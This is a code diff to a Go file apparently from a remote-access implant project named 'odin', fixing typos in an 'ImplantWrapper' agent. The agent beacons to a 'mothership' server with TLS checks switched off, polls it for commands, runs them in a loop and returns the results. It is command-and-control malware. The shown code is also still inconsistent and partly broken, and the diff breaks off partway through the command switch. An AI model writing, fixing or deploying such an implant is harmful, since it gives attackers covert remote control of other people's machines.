@@ -3,11 +3,18 @@ package agent
 import(
   "os"
   "log"
+  "fmt"
+  "net"
   "time"
+  "bytes"
   "os/exec"
+  "net/http"
   "runtime"
+  "encoding/gob"
   "crypto/tls"
   "crypto/x509"
+  "odin/lib/core"
+  "odin/lib/utils"
   "odin/lib/penguins/zoo"
 )
 
@@ -28,10 +35,11 @@ func (iw *ImplantWrapper) RunAgent(){
     url string
     client *http.Client
     requestBody bytes.Buffer
+    output string
   )
   client = new(http.Client)
   if iw.Tls {
-    client = &http.CLient{
+    client = &http.Client{
 			Transport: &http.Transport{
 				TLSClientConfig: &tls.Config{
 					InsecureSkipVerify: true,
@@ -51,7 +59,7 @@ func (iw *ImplantWrapper) RunAgent(){
   type Data struct{
     Body interface{}
   }
-  work := &Data{ Body: im.MotherShipID, }
+  work := &Data{ Body: iw.MothershipID, }
   if err = iw.Encoder.Encode(work); err != nil{
     fmt.Println("Error ecoding request: ",err);return
   }
@@ -64,7 +72,7 @@ func (iw *ImplantWrapper) RunAgent(){
   if err != nil{
     fmt.Println("Error sending request: ",err);return
   }
-  cookie := resp.Body.Heder.Get("Coockie")
+  cookie := resp.Body.Header.Get("Coockie")
   resp.Body.Close();time.Sleep(5 * time.Second)
   START:
   // get work
@@ -75,16 +83,16 @@ func (iw *ImplantWrapper) RunAgent(){
   if req,err = http.NewRequest("GET",url+"/?data=getwork",work); err != nil{
     fmt.Println("Error getting work: ",err);goto START
   }
-  resp,err := client.Do(req)
+  resp,err = client.Do(req)
   if err != nil{
     fmt.Println("Error sending request: ",err);return
   }
   // switch the work
-  if err = iw.Decode(resp.Body); err != nil{
+  if err = iw.Decoder.Decode(resp.Body); err != nil{
     fmt.Println("Error Decoding resp: ",err);goto START
   }
   resp.Body.Close()
-  switch work.CmdIn {
+  switch work.Work.CmdIn {
   case "":
     time.Sleep(5 * time.Second)
     goto START
@@ -93,7 +101,7 @@ func (iw *ImplantWrapper) RunAgent(){
     goto START
   case "getos":
     output = runtime.GOOS
-    work.CmdOut += output
+    work.Work.CmdOut += output
     iw.SendOutput(cmd)
     goto START
   case "upload":
